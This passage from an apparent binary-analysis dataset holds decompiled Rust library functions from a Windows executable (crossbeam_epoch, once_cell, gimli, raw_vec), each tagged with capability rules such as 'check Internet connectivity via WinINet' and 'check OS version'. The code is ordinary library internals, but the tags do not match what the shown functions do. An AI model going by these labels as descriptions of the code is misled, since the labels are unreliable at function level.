0x40ba8c;\n            sym.crossbeam_epoch::guard::Guard::defer_unchecked::h7ae233d637756e7f(0x445b60, uVar7);\n            uVar9 = *puVar8;\n            uVar10 = puVar8[1];\n            uVar11 = puVar8[2];\n            uVar12 = puVar8[3];\n            *(&stack0xffffffffffffffc0 + iVar4) = 0x40baa4;\n            sym.memcpy(&stack0x00000008 + iVar4, puVar8 + 4, 0x800);\n            *(&stack0xfffffffffffffff8 + iVar4) = CONCAT412(uVar12, CONCAT48(uVar11, CONCAT44(uVar10, uVar9)));\n        }\n        *(&stack0xffffffffffffffc0 + iVar4) = 0x40baba;\n        sym.memcpy(&stack0x00000808 + iVar4, &stack0xfffffffffffffff8 + iVar4, 0x810);\n        iVar3 = *(&stack0x00000810 + iVar4);\n        *(&stack0xffffffffffffffc0 + iVar4) = 0x40baca;\n        sym.core::ptr::drop_in_place_core::option::Option_crossbeam_epoch::internal::SealedBag__::hfc51ee622985ac6a\n                  (&stack0x00000808 + iVar4);\n        if (iVar3 == 0) {\n            arg1_01 = *(arg1_00 + 0x80);\n            *(&stack0xffffffffffffffc0 + iVar4) = 0x40badf;\n            sym.core::mem::drop::heb6a229d2a5ab360(arg1_01);\n            if (arg1_00 != -1) {\n                LOCK();\n                piVar1 = arg1_00 + 8;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    *(&stack0xffffffffffffffc0 + iVar4) = 0x40baf9;\n                    sym.__rust_dealloc(arg1_00, 0x80);\n                }\n            }\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1417
    },
    "fc51ee62": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_core::option::Option_crossbeam_epoch::internal::SealedBag__::hfc51ee622985ac6a\n               (int64_t arg1)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    uint64_t arg1_00;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    // core::ptr::drop_in_place<core::option::Option<crossbeam_epoch::internal::SealedBag>>::hfc51ee622985ac6a\n    if (*(arg1 + 8) == 0) {\n        return;\n    }\n    arg1_00 = *(arg1 + 0x808);\n    if (arg1_00 < 0x41) {\n        for (iVar7 = 0; uVar6 = *0x445b84,  uVar5 = *0x445b80,  uVar4 = *0x445b7c,  arg1_00 << 5 != iVar7;\n            iVar7 = iVar7 + 0x20) {\n            ppcVar1 = arg1 + 8 + iVar7;\n            pcVar3 = *ppcVar1;\n            uStack64 = *(ppcVar1 + 1);\n            uStack60 = *(ppcVar1 + 0xc);\n            puVar2 = arg1 + 0x18 + iVar7;\n            uStack56 = *puVar2;\n            uStack52 = puVar2[1];\n            uStack48 = puVar2[2];\n            uStack44 = puVar2[3];\n            puVar2 = arg1 + 0x18 + iVar7;\n            *puVar2 = *0x445b78;\n            puVar2[1] = uVar4;\n            puVar2[2] = uVar5;\n            puVar2[3] = uVar6;\n            uVar6 = *0x445b74;\n            uVar5 = *0x445b70;\n            uVar4 = *0x445b6c;\n            puVar2 = arg1 + 8 + iVar7;\n            *puVar2 = *0x445b68;\n            puVar2[1] = uVar4;\n            puVar2[2] = uVar5;\n            puVar2[3] = uVar6;\n            (*pcVar3)(&uStack64);\n        }\n        return;\n    }\n    dbg.slice_end_index_len_fail(arg1_00, 0x40);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 621
    },
    "c50a215f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong sym.once_cell::imp::OnceCell_T_::initialize::__u7b__u7b_closure_u7d__u7d_::hc50a215fac5a7fba(int64_t **arg1)\n\n{\n    code *pcVar1;\n    int64_t **ppiVar2;\n    int64_t iVar3;\n    int64_t *arg1_00;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    char *pcStack32;\n    ulong uStack24;\n    \n    // once_cell::imp::OnceCell<T>::initialize::_$u7b$$u7b$closure$u7d$$u7d$::hc50a215fac5a7fba\n    iVar3 = **arg1;\n    **arg1 = 0;\n    pcVar1 = *(iVar3 + 0x10);\n    *(iVar3 + 0x10) = 0;\n    if (pcVar1 != NULL) {\n        iVar3 = (*pcVar1)();\n        ppiVar2 = arg1[1];\n        arg1_00 = *ppiVar2;\n        if (*arg1_00 != 0) {\n            sym.core::ptr::drop_in_place_crossbeam_epoch::collector::Collector_::hc8b5a31c7f8871af(arg1_00);\n            arg1_00 = *ppiVar2;\n        }\n        *arg1_00 = iVar3;\n        return 1;\n    }\n    uStack64 = 0x44bfb8;\n    uStack56 = 1;\n    uStack48 = 0;\n    pcStack32 = \n    \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n    ;\n    uStack24 = 0;\n    dbg.panic_fmt(&uStack64, 0x44c028);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 453
    },
    "9143a98e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * sym.crossbeam_epoch::default::HANDLE::__getit::h9143a98e54b6306a(void)\n\n{\n    int64_t *arg2;\n    int64_t iVar1;\n    int64_t iStack32;\n    int64_t iStack24;\n    \n    // crossbeam_epoch::default::HANDLE::__getit::h9143a98e54b6306a\n    arg2 = sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.117();\n    if ((arg2 < 0x2) || (*arg2 == 0)) {\n        arg2 = sym._ZN3std10sys_common16thread_local_key9StaticKey3get17heff87df9eba4a787E.117();\n        if (arg2 == NULL) {\n            arg2 = sym._ZN5alloc5alloc15exchange_malloc17h9d5ddd9e636df918E.116(0x18, 8);\n            *arg2 = 0;\n            arg2[2] = 0x443010;\n            sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.118(0x443010, arg2);\n        }\n        else if (arg2 == 0x1) {\n            return NULL;\n        }\n        sym.once_cell::sync::Lazy_T_F_::force::h568fdafcba663bad();\n        iVar1 = sym.crossbeam_epoch::collector::Collector::register::hb5d3f69dce6e9b03();\n        iStack32 = *arg2;\n        iStack24 = arg2[1];\n        *arg2 = 1;\n        arg2[1] = iVar1;\n        sym.core::ptr::drop_in_place_core::option::Option_crossbeam_epoch::collector::LocalHandle__::heb58acba52a62f7a\n                  (&iStack32);\n    }\n    return arg2 + 1;\n}\n",
        "token_count": 448
    },
    "aea89cfe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c(ulong *arg1, int64_t arg2, int64_t arg3, ulong *arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    // alloc::raw_vec::finish_grow::haea89cfef0f1116c\n    if (arg3 == 0) {\n        arg1[1] = arg2;\n        uVar2 = 1;\n        arg3 = 0;\n    }\n    else {\n        if ((arg4[2] == 0) || (arg4[1] == 0)) {\n            iVar3 = arg3;\n            iVar1 = sym._ZN5alloc5alloc6Global10alloc_impl17hd38d3c93a0ea2d69E.123(arg2, arg3);\n        }\n        else {\n            iVar1 = sym.__rust_realloc(*arg4, arg4[1], arg3, arg2);\n            iVar3 = arg2;\n        }\n        if (iVar1 == 0) {\n            arg1[1] = arg2;\n            uVar2 = 1;\n        }\n        else {\n            arg1[1] = iVar1;\n            uVar2 = 0;\n            arg3 = iVar3;\n        }\n    }\n    arg1[2] = arg3;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 321
    },
    "1cfcd04c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint64_t sym.gimli::read::abbrev::Abbreviations::insert::h1cfcd04c6d095aad(int64_t *arg1, uint64_t *arg2)\n\n{\n    uint64_t *puVar1;\n    uint *puVar2;\n    ulong *puVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint32_t uVar30;\n    int64_t iVar31;\n    ulong *puVar32;\n    ulong *puVar33;\n    uint64_t uVar34;\n    ulong *puVar35;\n    ulong uVar36;\n    uint64_t uVar37;\n    int16_t iVar38;\n    int64_t iVar39;\n    ulong *puVar40;\n    ulong uVar41;\n    ulong *unaff_RSI;\n    uint64_t uVar42;\n    int64_t iVar43;\n    ulong uVar44;\n    uint64_t uVar45;\n    bool bVar46;\n    char cVar47;\n    uint64_t uStack912;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    uint uStack856;\n    uint uStack852;\n    uint uStack848;\n    uint uStack844;\n    uint uStack840;\n    uint uStack836;\n    uint uStack832;\n    uint uStack828;\n    uint uStack824;\n    uint uStack820;\n    uint uStack816;\n    uint uStack812;\n    uint uStack808;\n    uint uStack804;\n    uint uStack800;\n    uint uStack796;\n    uint uStack792;\n    uint uStack788;\n    uint uStack784;\n    uint uStack780;\n    uint uStack776;\n    uint uStack772;\n    uint uStack768;\n    uint uStack764;\n    int64_t iStack720;\n    uint uStack712;\n    uint uStack708;\n    uint uStack704;\n    uint uStack700;\n    uint uStack488;\n    uint uStack484;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    ulong var_1h;\n    \n    // gimli::read::abbrev::Abbreviations::insert::h1cfcd04c6d095aad\n    uVar34 = *arg2;\n    uVar42 = uVar34 - 1;\n    if (uVar42 < arg1[2]) {\ncode_r0x0040bfa3:\n        uVar42 = CONCAT71(unaff_RSI >> 8, 1);\n        if (((arg2[1] != 0) && (arg2[3] != 0)) && ((arg2[3] & 0xfffffffffffffff) != 0)) {\n            sym.__rust_dealloc(arg2[2], 8);\n        }\n        goto code_r0x0040c290;\n    }\n    if (uVar42 == arg1[2]) {\n        if ((arg1[5] != 0) && (iVar31 = arg1[4],  iVar31 != 0)) {\n            iVar43 = arg1[3];\n            do {\n                iVar39 = *(iVar31 + 0x532) * 8;\n                unaff_RSI = 0xffffffffffffffff;\n                do {\n                    puVar32 = *(iVar31 + 0x532);\n                    if (iVar39 == 0) goto code_r0x0040c05d;\n                    puVar1 = iVar31 + 0x10 + unaff_RSI * 8;\n                    cVar47 = *puVar1 != uVar34;\n                    if (uVar34 <= *puVar1 && cVar47) {\n                        cVar47 = -1;\n                    }\n                    unaff_RSI = unaff_RSI + 1;\n                    iVar39 = iVar39 + -8;\n                } while (cVar47 == '\\x01');\n                puVar32 = unaff_RSI;\n                if (cVar47 != -1) goto code_r0x0040bfa3;\ncode_r0x0040c05d:\n                bVar46 = iVar43 == 0;\n                iVar43 = iVar43 + -1;\n                if (bVar46) break;\n                iVar31 = *(iVar31 + 0x538 + puVar32 * 8);\n            } while( true );\n        }\n        if (uVar42 == arg1[1]) {\n            sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h5de88aeb0ab60f00(arg1, uVar42);\n            uVar42 = arg1[2];\n        }\n        iVar31 = *arg1;\n        iVar43 = uVar42 * 0x70;\n        uVar6 = *(arg2 + 100);\n        uVar7 = *(arg2 + 0xd);\n        uVar8 = *(arg2 + 0x6c);\n        puVar2 = iVar31 + 0x60 + iVar43;\n        *puVar2 = *(arg2 + 0xc);\n        puVar2[1] = uVar6;\n        puVar2[2] = uVar7;\n        puVar2[3] = uVar8;\n        uVar6 = *(arg2 + 0x54);\n        uVar7 = *(arg2 + 0xb);\n        uVar8 = *(arg2 + 0x5c);\n        puVar2 = iVar31 + 0x50 + iVar43;\n        *puVar2 = *(arg2 + 10);\n        puVar2[1] = uVar6;\n        puVar2[2] = uVar7;\n        puVar2[3] = uVar8;\n        uVar6 = *(arg2 + 0x44);\n        uVar7 = *(arg2 + 9);\n        uVar8 = *(arg2 + 0x4c);\n        puVar2 = iVar31 + 0x40 + iVar43;\n        *puVar2 = *(arg2 + 8);\n        puVar2[1] = uVar6;\n        puVar2[2] = uVar7;\n        puVar2[3] = uVar8;\n        uVar6 = *arg2;\n        uVar7 = *(arg2 + 4);\n        uVar8 = *(arg2 + 1);\n        uVar9 = *(arg2 + 0xc);\n        uVar10 = *(arg2 + 2);\n        uVar11 = *(arg2 + 0x14);\n        uVar12 = *(arg2 + 3);\n        uVar13 = *(arg2 + 0x1c);\n        uVar14 = *(arg2 + 4);\n        uVar15 = *(arg2 + 0x24);\n        uVar16 = *(arg2 + 5);\n        uVar17 = *(arg2 + 0x2c);\n        uVar18 = *(arg2 + 0x34);\n        uVar19 = *(arg2 + 7);\n        uVar20 = *(arg2 + 0x3c);\n        puVar2 = iVar31 + 0x30 + iVar43;\n        *puVar2 = *(arg2 + 6);\n        puVar2[1] = uVar18;\n        puVar2[2] = uVar19;\n        puVar2[3] = uVar20;\n        puVar2 = iVar31 + 0x20 + iVar43;\n        *puVar2 = uVar14;\n        puVar2[1] = uVar15;\n        puVar2[2] = uVar16;\n        puVar2[3] = uVar17;\n        puVar2 = iVar31 + 0x10 + iVar43;\n        *puVar2 = uVar10;\n        puVar2[1] = uVar11;\n        puVar2[2] = uVar12;\n        puVar2[3] = uVar13;\n        puVar2 = iVar31 + iVar43;\n        *puVar2 = uVar6;\n        puVar2[1] = uVar7;\n        puVar2[2] = uVar8;\n        puVar2[3] = uVar9;\n        arg1[2] = uVar42 + 1;\n    }\n    else {\n        unaff_RSI = arg1[4];\n        if (unaff_RSI != NULL) {\n            iVar31 = arg1[3];\n            do {\n                uVar4 = *(unaff_RSI + 0x532);\n                uVar45 = uVar4;\n                iVar43 = uVar45 * 8;\n                uVar42 = 0xffffffffffffffff;\n                do {\n                    uVar37 = uVar45;\n                    if (iVar43 == 0) goto code_r0x0040c0cd;\n                    cVar47 = unaff_RSI[uVar42 + 2] != uVar34;\n                    if (uVar34 <= unaff_RSI[uVar42 + 2] && cVar47) {\n                        cVar47 = -1;\n                    }\n                    uVar42 = uVar42 + 1;\n                    iVar43 = iVar43 + -8;\n                } while (cVar47 == '\\x01');\n                uVar37 = uVar42;\n                if (cVar47 != -1) goto code_r0x0040bfa3;\ncode_r0x0040c0cd:\n                bVar46 = iVar31 == 0;\n                iVar31 = iVar31 + -1;\n                if (bVar46) goto code_r0x0040c2a6;\n                unaff_RSI = unaff_RSI[uVar37 + 0xa7];\n            } while( true );\n        }\n        puVar32 = sym.__rust_alloc(0x538, 8);\n        if (puVar32 == NULL) {\n            dbg.handle_alloc_error(0x538);\n            goto code_r0x0040d5b6;\n        }\n        *puVar32 = 0;\n        uVar6 = *(arg2 + 4);\n        uVar7 = *(arg2 + 1);\n        uVar8 = *(arg2 + 0xc);\n        uVar9 = *(arg2 + 2);\n        uVar10 = *(arg2 + 0x14);\n        uVar11 = *(arg2 + 3);\n        uVar12 = *(arg2 + 0x1c);\n        uVar13 = *(arg2 + 4);\n        uVar14 = *(arg2 + 0x24);\n        uVar15 = *(arg2 + 5);\n        uVar16 = *(arg2 + 0x2c);\n        uVar17 = *(arg2 + 6);\n        uVar18 = *(arg2 + 0x34);\n        uVar19 = *(arg2 + 7);\n        uVar20 = *(arg2 + 0x3c);\n        *(puVar32 + 0xc) = *arg2;\n        *(puVar32 + 100) = uVar6;\n        *(puVar32 + 0xd) = uVar7;\n        *(puVar32 + 0x6c) = uVar8;\n        *(puVar32 + 0xe) = uVar9;\n        *(puVar32 + 0x74) = uVar10;\n        *(puVar32 + 0xf) = uVar11;\n        *(puVar32 + 0x7c) = uVar12;\n        *(puVar32 + 0x10) = uVar13;\n        *(puVar32 + 0x84) = uVar14;\n        *(puVar32 + 0x11) = uVar15;\n        *(puVar32 + 0x8c) = uVar16;\n        *(puVar32 + 0x12) = uVar17;\n        *(puVar32 + 0x94) = uVar18;\n        *(puVar32 + 0x13) = uVar19;\n        *(puVar32 + 0x9c) = uVar20;\n        uVar6 = *(arg2 + 0x44);\n        uVar7 = *(arg2 + 9);\n        uVar8 = *(arg2 + 0x4c);\n        *(puVar32 + 0x14) = *(arg2 + 8);\n        *(puVar32 + 0xa4) = uVar6;\n        *(puVar32 + 0x15) = uVar7;\n        *(puVar32 + 0xac) = uVar8;\n        uVar6 = *(arg2 + 0x54);\n        uVar7 = *(arg2 + 0xb);\n        uVar8 = *(arg2 + 0x5c);\n        *(puVar32 + 0x16) = *(arg2 + 10);\n        *(puVar32 + 0xb4) = uVar6;\n        *(puVar32 + 0x17) = uVar7;\n        *(puVar32 + 0xbc) = uVar8;\n        uVar6 = *(arg2 + 100);\n        uVar7 = *(arg2 + 0xd);\n        uVar8 = *(arg2 + 0x6c);\n        *(puVar32 + 0x18) = *(arg2 + 0xc);\n        *(puVar32 + 0xc4) = uVar6;\n        *(puVar32 + 0x19) = uVar7;\n        *(puVar32 + 0xcc) = uVar8;\n        *(puVar32 + 0x532) = 1;\n        puVar32[1] = uVar34;\n        arg1[3] = 0;\n        arg1[4] = puVar32;\n        arg1[5] = 1;\n    }\n    goto code_r0x0040c28e;\ncode_r0x0040c2a6:\n    if (uVar4 < 0xb) {\n        if (uVar37 < uVar45) {\n            sub.msvcrt.dll_memmove(unaff_RSI + uVar37 + 2, unaff_RSI + uVar37 + 1, (uVar45 - uVar37) * 8);\n            unaff_RSI[uVar37 + 1] = uVar34;\n            uStack776 = *(arg2 + 0xc);\n            uStack772 = *(arg2 + 100);\n            uStack768 = *(arg2 + 0xd);\n            uStack764 = *(arg2 + 0x6c);\n            uStack792 = *(arg2 + 10);\n            uStack788 = *(arg2 + 0x54);\n            uStack784 = *(arg2 + 0xb);\n            uStack780 = *(arg2 + 0x5c);\n            uStack808 = *(arg2 + 8);\n            uStack804 = *(arg2 + 0x44);\n            uStack800 = *(arg2 + 9);\n            uStack796 = *(arg2 + 0x4c);\n            uStack872 = *arg2;\n            uStack868 = *(arg2 + 4);\n            uStack864 = *(arg2 + 1);\n            uStack860 = *(arg2 + 0xc);\n            uStack856 = *(arg2 + 2);\n            uStack852 = *(arg2 + 0x14);\n            uStack848 = *(arg2 + 3);\n            uStack844 = *(arg2 + 0x1c);\n            uStack840 = *(arg2 + 4);\n            uStack836 = *(arg2 + 0x24);\n            uStack832 = *(arg2 + 5);\n            uStack828 = *(arg2 + 0x2c);\n            uStack824 = *(arg2 + 6);\n            uStack820 = *(arg2 + 0x34);\n            uStack816 = *(arg2 + 7);\n            uStack812 = *(arg2 + 0x3c);\n            sub.msvcrt.dll_memmove\n                      (unaff_RSI + (uVar37 + 1) * 0xe + 0xc, unaff_RSI + uVar37 * 0xe + 0xc, (uVar45 - uVar37) * 0x70);\n        }\n        else {\n            unaff_RSI[uVar37 + 1] = uVar34;\n            uStack776 = *(arg2 + 0xc);\n            uStack772 = *(arg2 + 100);\n            uStack768 = *(arg2 + 0xd);\n            uStack764 = *(arg2 + 0x6c);\n            uStack792 = *(arg2 + 10);\n            uStack788 = *(arg2 + 0x54);\n            uStack784 = *(arg2 + 0xb);\n            uStack780 = *(arg2 + 0x5c);\n            uStack808 = *(arg2 + 8);\n            uStack804 = *(arg2 + 0x44);\n            uStack800 = *(arg2 + 9);\n            uStack796 = *(arg2 + 0x4c);\n            uStack872 = *arg2;\n            uStack868 = *(arg2 + 4);\n            uStack864 = *(arg2 + 1);\n            uStack860 = *(arg2 + 0xc);\n            uStack856 = *(arg2 + 2);\n            uStack852 = *(arg2 + 0x14);\n            uStack848 = *(arg2 + 3);\n            uStack844 = *(arg2 + 0x1c);\n            uStack840 = *(arg2 + 4);\n            uStack836 = *(arg2 + 0x24);\n            uStack832 = *(arg2 + 5);\n            uStack828 = *(arg2 + 0x2c);\n            uStack824 = *(arg2 + 6);\n            uStack820 = *(arg2 + 0x34);\n            uStack816 = *(arg2 + 7);\n            uStack812 = *(arg2 + 0x3c);\n        }\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0x18;\n        *puVar32 = uStack776;\n        *(puVar32 + 4) = uStack772;\n        *(puVar32 + 1) = uStack768;\n        *(puVar32 + 0xc) = uStack764;\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0x16;\n        *puVar32 = uStack792;\n        *(puVar32 + 4) = uStack788;\n        *(puVar32 + 1) = uStack784;\n        *(puVar32 + 0xc) = uStack780;\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0x14;\n        *puVar32 = uStack808;\n        *(puVar32 + 4) = uStack804;\n        *(puVar32 + 1) = uStack800;\n        *(puVar32 + 0xc) = uStack796;\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0x12;\n        *puVar32 = uStack824;\n        *(puVar32 + 4) = uStack820;\n        *(puVar32 + 1) = uStack816;\n        *(puVar32 + 0xc) = uStack812;\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0x10;\n        *puVar32 = uStack840;\n        *(puVar32 + 4) = uStack836;\n        *(puVar32 + 1) = uStack832;\n        *(puVar32 + 0xc) = uStack828;\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0xe;\n        *puVar32 = uStack856;\n        *(puVar32 + 4) = uStack852;\n        *(puVar32 + 1) = uStack848;\n        *(puVar32 + 0xc) = uStack844;\n        puVar32 = unaff_RSI + uVar37 * 0xe + 0xc;\n        *puVar32 = uStack872;\n        *(puVar32 + 4) = uStack868;\n        *(puVar32 + 1) = uStack864;\n        *(puVar32 + 0xc) = uStack860;\n        *(unaff_RSI + 0x532) = uVar4 + 1;\n        arg1[5] = arg1[5] + 1;\n    }\n    else {\n        bVar46 = true;\n        if (uVar37 < 5) {\n            uVar42 = 4;\n        }\n        else {\n            uVar42 = uVar37;\n            if (uVar37 != 5) {\n                if (uVar37 == 6) {\n                    bVar46 = false;\n                    uVar37 = 0;\n                    uVar42 = 5;\n                }\n                else {\n                    uVar37 = uVar37 - 7;\n                    bVar46 = false;\n                    uVar42 = 6;\n                }\n            }\n        }\n        puVar32 = sym.__rust_alloc(0x538, 8);\n        if (puVar32 == NULL) {\n            dbg.handle_alloc_error(0x538);\ncode_r0x0040d5b6:\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *puVar32 = 0;\n        uVar4 = *(unaff_RSI + 0x532);\n        uVar45 = ~uVar42 + uVar4;\n        *(puVar32 + 0x532) = uVar45;\n        uVar41 = unaff_RSI[uVar42 + 1];\n        puVar40 = unaff_RSI + uVar42 * 0xe + 0x18;\n        uStack312 = *puVar40;\n        uStack308 = *(puVar40 + 4);\n        uStack304 = *(puVar40 + 1);\n        uStack300 = *(puVar40 + 0xc);\n        puVar40 = unaff_RSI + uVar42 * 0xe + 0x16;\n        uStack328 = *puVar40;\n        uStack324 = *(puVar40 + 4);\n        uStack320 = *(puVar40 + 1);\n        uStack316 = *(puVar40 + 0xc);\n        puVar40 = unaff_RSI + uVar42 * 0xe + 0x14;\n        uStack344 = *puVar40;\n        uStack340 = *(puVar40 + 4);\n        uStack336 = *(puVar40 + 1);\n        uStack332 = *(puVar40 + 0xc);\n        uVar44 = unaff_RSI[uVar42 * 0xe + 0xc];\n        iVar31 = (unaff_RSI + uVar42 * 0xe + 0xc)[1];\n        puVar40 = unaff_RSI + uVar42 * 0xe + 0xe;\n        uStack488 = *puVar40;\n        uStack484 = *(puVar40 + 4);\n        uStack384 = *(puVar40 + 1);\n        uStack380 = *(puVar40 + 0xc);\n        puVar40 = unaff_RSI + uVar42 * 0xe + 0x10;\n        uStack376 = *puVar40;\n        uStack372 = *(puVar40 + 4);\n        uStack368 = *(puVar40 + 1);\n        uStack364 = *(puVar40 + 0xc);\n        puVar40 = unaff_RSI + uVar42 * 0xe + 0x12;\n        uStack360 = *puVar40;\n        uStack356 = *(puVar40 + 4);\n        uStack352 = *(puVar40 + 1);\n        uStack348 = *(puVar40 + 0xc);\n        if (0xb < uVar45) {\n            dbg.slice_end_index_len_fail(uVar45, 0xb);\n            goto code_r0x0040d5b6;\n        }\n        if (uVar4 - (uVar42 + 1) != uVar45) {\n            dbg.panic(str.assertion_failed:_src.len____dst.len__, 0x28, \n                      str.assertion_failed:_src.len____dst.len__ + 0x28);\n            goto code_r0x0040d5b6;\n        }\n        sym.memcpy(puVar32 + 1, unaff_RSI + uVar42 + 2, uVar45 * 8);\n        sym.memcpy(puVar32 + 0xc, unaff_RSI + (uVar42 + 1) * 0xe + 0xc, uVar45 * 0x70);\n        *(unaff_RSI + 0x532) = uVar42;\n        puVar40 = puVar32;\n        if (bVar46) {\n            puVar40 = unaff_RSI;\n        }\n        uVar4 = *(puVar40 + 0x532);\n        if (uVar4 < uVar37 + 1) {\n            puVar40[uVar37 + 1] = uVar34;\n            uStack776 = *(arg2 + 0xc);\n            uStack772 = *(arg2 + 100);\n            uStack768 = *(arg2 + 0xd);\n            uStack764 = *(arg2 + 0x6c);\n            uStack792 = *(arg2 + 10);\n            uStack788 = *(arg2 + 0x54);\n            uStack784 = *(arg2 + 0xb);\n            uStack780 = *(arg2 + 0x5c);\n            uStack808 = *(arg2 + 8);\n            uStack804 = *(arg2 + 0x44);\n            uStack800 = *(arg2 + 9);\n            uStack796 = *(arg2 + 0x4c);\n            uStack872 = *arg2;\n            uStack868 = *(arg2 + 4);\n            uStack864 = *(arg2 + 1);\n            uStack860 = *(arg2 + 0xc);\n            uStack856 = *(arg2 + 2);\n            uStack852 = *(arg2 + 0x14);\n            uStack848 = *(arg2 + 3);\n            uStack844 = *(arg2 + 0x1c);\n            uStack840 = *(arg2 + 4);\n            uStack836 = *(arg2 + 0x24);\n            uStack832 = *(arg2 + 5);\n            uStack828 = *(arg2 + 0x2c);\n            uStack824 = *(arg2 + 6);\n            uStack820 = *(arg2 + 0x34);\n            uStack816 = *(arg2 + 7);\n            uStack812 = *(arg2 + 0x3c);\n        }\n        else {\n            iVar43 = uVar4 - uVar37;\n            sub.msvcrt.dll_memmove(puVar40 + uVar37 + 2, puVar40 + uVar37 + 1, iVar43 * 8);\n            puVar40[uVar37 + 1] = uVar34;\n            uStack776 = *(arg2 + 0xc);\n            uStack772 = *(arg2 + 100);\n            uStack768 = *(arg2 + 0xd);\n            uStack764 = *(arg2 + 0x6c);\n            uStack792 = *(arg2 + 10);\n            uStack788 = *(arg2 + 0x54);\n            uStack784 = *(arg2 + 0xb);\n            uStack780 = *(arg2 + 0x5c);\n            uStack808 = *(arg2 + 8);\n            uStack804 = *(arg2 + 0x44);\n            uStack800 = *(arg2 + 9);\n            uStack796 = *(arg2 + 0x4c);\n            uStack872 = *arg2;\n            uStack868 = *(arg2 + 4);\n            uStack864 = *(arg2 + 1);\n            uStack860 = *(arg2 + 0xc);\n            uStack856 = *(arg2 + 2);\n            uStack852 = *(arg2 + 0x14);\n            uStack848 = *(arg2 + 3);\n            uStack844 = *(arg2 + 0x1c);\n            uStack840 = *(arg2 + 4);\n            uStack836 = *(arg2 + 0x24);\n            uStack832 = *(arg2 + 5);\n            uStack828 = *(arg2 + 0x2c);\n            uStack824 = *(arg2 + 6);\n            uStack820 = *(arg2 + 0x34);\n            uStack816 = *(arg2 + 7);\n            uStack812 = *(arg2 + 0x3c);\n            sub.msvcrt.dll_memmove(puVar40 + (uVar37 + 1) * 0xe + 0xc, puVar40 + uVar37 * 0xe + 0xc, iVar43 * 0x70);\n        }\n        puVar35 = puVar40 + uVar37 * 0xe + 0x18;\n        *puVar35 = uStack776;\n        *(puVar35 + 4) = uStack772;\n        *(puVar35 + 1) = uStack768;\n        *(puVar35 + 0xc) = uStack764;\n        puVar35 = puVar40 + uVar37 * 0xe + 0x16;\n        *puVar35 = uStack792;\n        *(puVar35 + 4) = uStack788;\n        *(puVar35 + 1) = uStack784;\n        *(puVar35 + 0xc) = uStack780;\n        puVar35 = puVar40 + uVar37 * 